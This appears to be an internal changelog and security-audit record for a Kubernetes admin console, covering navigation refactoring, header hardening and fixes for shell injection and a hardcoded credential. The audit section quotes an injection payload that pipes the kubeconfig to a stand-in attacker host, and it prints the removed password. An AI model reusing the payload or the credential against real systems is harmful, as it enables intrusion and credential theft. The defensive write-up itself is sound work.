---
title: Console Modularity, Security & UX — May 2026
description: Comprehensive overhaul of navigation, security headers, and UX patterns implemented 2026-05-11
---

# Console Modularity, Security & UX Overhaul

## Implemented 2026-05-11

### Navigation: Single Source of Truth
- **File:** `src/lib/nav-config.ts`
- All 45+ nav items defined ONCE in `NAV_GROUPS` array
- Exports: `NAV_GROUPS`, `ALL_NAV_ITEMS`, `HREF_ICON_MAP`, `HREF_LABEL_MAP`, `MOBILE_BOTTOM_NAV`, `MOBILE_DRAWER_NAV`
- sidebar.tsx and layout.tsx import from here — no more duplication
- Adding a new page = edit nav-config.ts only (plus register in all-services auto-updates)

### KubeConfig Singleton
- **File:** `src/lib/kube-client.ts`
- `makeKc()` singleton + typed factory functions: `makeCoreApi()`, `makeAppsApi()`, `makeCustomApi()`, `makeBatchApi()`, `makeRbacApi()`, `makeNetworkApi()`
- API routes should import from here instead of creating new KubeConfig inline

### Security Fixes
- **CSP:** Removed `unsafe-eval` from `script-src` (was allowing arbitrary eval)
- **Rate Limiter:** `x-real-ip` (Traefik-set, not spoofable) preferred over `x-forwarded-for`
- **Memory leak:** Added `setInterval` cleanup to remove stale rate limit entries
- **HSTS:** Extended to 2 years (63072000s) with `preload`
- **Added headers:** `X-DNS-Prefetch-Control: off`, `X-Download-Options: noopen`, `Cross-Origin-Embedder-Policy: unsafe-none`, `Cross-Origin-Opener-Policy: same-origin-allow-popups`

### Sidebar Redesign (Azure-style)
- Collapsible groups with smooth AnimatePresence animation
- Groups: Overview + Platform open by default; Infrastructure/Tools/Services/Settings closed
- Inline search filter (type to filter all services live)
- Pinned favorites section at top (star icon on hover to pin)
- Recent pages section below favorites
- Role badge: admin=indigo, operator=amber, viewer=slate
- "All Services" link at bottom of nav
- Sign-out button in user footer
- Collapsed state: shows group icons with tooltips

### All Services Page
- **Route:** `/all-services`
- Searchable card grid of ALL 45+ pages grouped by category
- Real-time filter as you type
- Star icon to pin to favorites directly from this page
- Like Azure Portal "All services" — perfect for discoverability

## Pattern: Adding a New Page
1. Add entry to `NAV_GROUPS` in `src/lib/nav-config.ts` with `description` field
2. If mobile-important: add to `MOBILE_DRAWER_NAV` in same file
3. Create the page file
4. Done — sidebar, mobile drawer, All Services page, and command palette all auto-include it

## Security Audit — May 2026 (Round 2)

### CRITICAL Fixes Applied (commit bc2ab4d)

#### 1. Shell Injection in pods/exec — FIXED
- **Was:** `child_process.exec()` with `namespace`, `pod`, `container` interpolated into shell string
- **Attack:** `namespace = "default; curl evil.com/$(cat /kubeconfig)"` → RCE
- **Fix:** `execFile()` (no shell) + Zod validation with K8s name regex + admin-only role + rate limit 10/min + audit log
- **File:** `src/app/api/pods/exec/route.ts`

#### 2. Plaintext credential fallback — FIXED
- **Was:** `SYNOLOGY_PASSWORD ?? "CodeRE52"` — real password hardcoded in source
- **Fix:** Removed fallback; returns 401 with error if env var not set
- **File:** `src/app/api/nas/shares/route.ts`

#### 3. Traefik secure-headers upgraded — FIXED
- HSTS: 1yr → 2yr+preload
- X-Frame-Options: SAMEORIGIN → DENY
- Removed deprecated X-XSS-Protection
- Added X-Robots-Tag: noindex + cleared X-Powered-By fingerprint
- **File:** `kubernetes/platform/external-routes/manifests/01-middlewares.yaml`

#### 4. logs/stream — role check added — FIXED
- **Was:** Any authenticated user (viewer) could stream any pod's logs
- **Fix:** operator or admin role required
- **File:** `src/app/api/logs/stream/route.ts`

#### 5. Zod validation on mutation routes — FIXED
- `users/invite`: Zod email, groups array, expiryHours with bounds
- `users/reset-password`: Zod username regex
- `nas/assign`: Zod with K8s name regex on all path-building fields
- `users-config/[username]`: SAFE_USERNAME_RE on dynamic segment

#### 6. API cache headers — FIXED
- `/api/*` routes now return `no-store, no-cache, must-revalidate` via middleware
- **File:** `src/middleware.ts`

### Known Remaining Issues (MEDIUM/LOW)

- NAS TLS bypass (`NODE_TLS_REJECT_UNAUTHORIZED = "0"`) — thread-unsafe global mutation
  - Workaround: try/finally restores value (mitigates race for most cases)
  - Proper fix: use undici Agent with `rejectUnauthorized: false` per-request
- Audit log writes to `/tmp` — ephemeral, not persisted across restarts
  - Stdout logging captures to `kubectl logs` (partial mitigation)
  - Proper fix: dedicated audit log PVC or structured log forwarder
- Rate limiter is in-memory only — doesn't work across 2 replicas
  - Mitigation: behind VPN (limited attack surface)
  - Proper fix: Redis/Valkey rate limiter sidecar
- `admin.ts` email-based admin bypass — `ADMIN_EMAILS` env var must be set correctly
  - Risk: if OIDC email claim can be spoofed, admin bypass possible
  - Mitigation: Authentik validates email ownership before issuing claims

### Security Pattern: K8s Name Validation
```ts
const K8S_NAME_RE = /^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/;
// Apply to all: namespace, pod, container, deployment, service names
// Max 63 chars for labels/names, 253 for FQDNs
```

### Security Pattern: execFile vs exec
```ts
// NEVER: shell injection possible via any interpolated string
exec(`kubectl exec -n ${namespace} ${pod} -- ${cmd}`)
// ALWAYS: execFile passes args directly to OS, no shell expansion
execFile("kubectl", ["exec", "-n", namespace, pod, "--", ...cmd.split(" ")])
```

